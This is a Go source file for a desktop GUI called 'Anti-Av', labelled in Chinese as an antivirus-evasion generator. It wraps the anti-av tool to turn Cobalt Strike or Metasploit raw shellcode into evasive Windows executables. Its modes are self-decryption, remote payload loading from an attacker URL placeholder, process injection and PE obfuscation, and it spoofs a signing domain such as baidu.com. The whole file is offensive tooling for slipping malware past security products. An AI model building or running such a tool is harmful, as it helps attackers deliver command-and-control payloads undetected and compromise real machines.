package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/b1gcat/anti-av/apps/av/utils"
	"github.com/sirupsen/logrus"
)

var (
	appWindow fyne.App
)

func main() {
	conf := Config{}
	conf.appRun()
}

func (c *Config) appRun() {
	c.appLoader()
	defer c.appQuit()

	win := appWindow.NewWindow("Anti-Av")
	win.SetPadded(false)
	win.SetIcon(icon)
	win.Resize(fyne.NewSize(600, 300))
	win.Show()
	win.CenterOnScreen()
	win.SetMaster()

	title := widget.NewLabel("免杀生成器")

	arch := widget.NewSelectEntry([]string{"AMD64", "386"})
	arch.SetText("AMD64")

	outputName := widget.NewEntry()
	outputName.SetText("OUTPUT")

	iconSelect := widget.NewSelectEntry([]string{"带图标", "无图标"})
	iconSelect.SetText("带图标")

	signText := widget.NewLabel("签名(域名)")
	sign := widget.NewEntry()
	sign.SetText("baidu.com")
	signBox := container.NewBorder(nil, nil, signText, nil, sign)

	selectEntry := widget.NewSelectEntry([]string{"自解密", "远程加载", "进程注入", "PE文件混淆"})
	selectEntry.SetText("自解密")

	remoteUrlText := widget.NewLabel("远程加载URL")
	remoteUrl := widget.NewEntry()
	remoteUrl.SetText("http://<LHOST:LPORT>/payload.raw")
	remoteUrlBox := container.NewBorder(nil, nil, remoteUrlText, nil, remoteUrl)
	remoteUrlBox.Hide()

	selectEntry.OnChanged = func(a string) {
		switch a {
		case "自解密":
			remoteUrlBox.Hide()
		case "远程加载":
			remoteUrlBox.Show()
		case "进程注入":
			remoteUrlBox.Hide()
		case "PE文件混淆":
			remoteUrlBox.Hide()
		}
	}

	fBtn := widget.NewButton("选择文件(cs或msf的raw格式bin)", nil)
	fBtn.OnTapped = func() {
		fd := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
			if err != nil {
				dialog.ShowError(err, win)
				return
			}
			defer reader.Close()

			file := reader.URI().Path()
			fBtn.SetText(file)
		}, win)
		fd.Show()
	}

	btn := widget.NewButtonWithIcon("生成", theme.ConfirmIcon(), func() {
		path, _ := os.Executable()
		path = filepath.Join(filepath.Dir(path))
		avDir := filepath.Join(path, "anti-av")
		if _, err := os.Stat(avDir); err != nil {
			logrus.Warnf("anti-av不存在, 下载源码:" +
				"git clone https://github.com/b1gcat/anti-av.git " + avDir)
			err := utils.Cmd(
				"git clone https://github.com/b1gcat/anti-av.git " + avDir)
			logrus.Warnf("Git-result:%v", err)
			if err != nil {
				return
			}
		}
		logrus.Info("Build anti-av...")
		suffix := ""
		if runtime.GOOS == "windows" {
			suffix = ".exe"
		}
		err := utils.Cmd("cd " + filepath.Join(avDir, "apps", "av") + " && " +
			"go build -o " + filepath.Join(avDir, "dist", "anti-av"+suffix))
		logrus.Warnf("Build-result:%v", err)
		if err != nil {
			return
		}

		logrus.Info("Build Generating command...")
		cmd := fmt.Sprintf("-v %s -ho www.%s -arch %s",
			sign.Text, sign.Text, strings.ToLower(arch.Text))
		if iconSelect.Text == "无图标" {
			cmd += " -no-icon"
		}
		logrus.Info("Generating...")
		switch selectEntry.Text {
		case "进程注入":
			cmd += " -mode inject " + "-o " + outputName.Text + ".exe"
			fallthrough
		case "自解密":
			err := utils.Cmd("cd " + filepath.Join(avDir, "dist") + " && " +
				fmt.Sprintf("%s -p %v %s",
					filepath.Join(avDir, "dist", "anti-av"), fBtn.Text, cmd))
			logrus.Warnf("Generating-result:%v", err)
			if err != nil {
				return
			}
		case "PE文件混淆":
			cmd += " -l pe" + " -o " + outputName.Text + ".exe"
			err := utils.Cmd("cd " + filepath.Join(avDir, "dist") + " && " +
				fmt.Sprintf("%s -p %v %s",
					filepath.Join(avDir, "dist", "anti-av"), fBtn.Text, cmd))
			logrus.Warnf("Generating-result:%v", err)
			if err != nil {
				return
			}
		case "远程加载":
			cmd1 := cmd + " -r " + " -o payload.raw"
			err := utils.Cmd("cd " + filepath.Join(avDir, "dist") + " && " +
				fmt.Sprintf("%s -p %v %s",
					filepath.Join(avDir, "dist", "anti-av"), fBtn.Text, cmd1))
			logrus.Warnf("Generating-result:%v", err)
			if err != nil {
				return
			}

			logrus.Info("*** raw payload:",
				filepath.Join(avDir, "dist", outputName.Text+".raw"))
			cmd += " -o " + outputName.Text + ".exe"
			err = utils.Cmd("cd " + filepath.Join(avDir, "dist") + " && " +
				fmt.Sprintf("%s -p '%v' %s",
					filepath.Join(avDir, "dist", "anti-av"), remoteUrl.Text, cmd))
			logrus.Warnf("Generating-result:%v", err)
			if err != nil {
				return
			}
			logrus.Warnf("Generating-result:%v", err)
			if err != nil {
				return
			}
		}
		if selectEntry.Text == "远程加载" {
			logrus.Infof("远程加载文件: %s", filepath.Join(avDir, "dist", "payload.raw"))
		}
		logrus.Infof("免杀文件: %s", filepath.Join(avDir, "dist", outputName.Text+".exe"))
		logrus.Info("完成")
	})

	content := container.NewVBox(
		title,
		arch,
		outputName,
		iconSelect,
		signBox,
		selectEntry,
		remoteUrlBox,
		fBtn,
		btn,
	)
	win.SetContent(content)

	appWindow.Run()
}

func (c *Config) appLoader() {
	if appWindow == nil {
		appWindow = app.NewWithID("com.b1gcat.av.ui")
		appWindow.Settings().SetTheme(theme.LightTheme())
		appWindow.SetIcon(icon)
	}
}

func (c *Config) appQuit() {
	appWindow.Quit()
}

func init() {
	path, _ := os.Executable()

	os.Setenv("FYNE_FONT", filepath.Join(filepath.Dir(path), "resources", "AlimamaDaoLiTi.ttf"))
	var logo []byte
	if runtime.GOOS == "windows" {
		logo, _ = os.ReadFile(filepath.Join(filepath.Dir(path), "resources", "logo.png"))
	} else {
		logo, _ = os.ReadFile(filepath.Join(filepath.Dir(path), "resources", "logo.png"))
	}
	icon.StaticContent = logo
}

var (
	icon = &fyne.StaticResource{
		StaticName: "logo.png",
	}
)
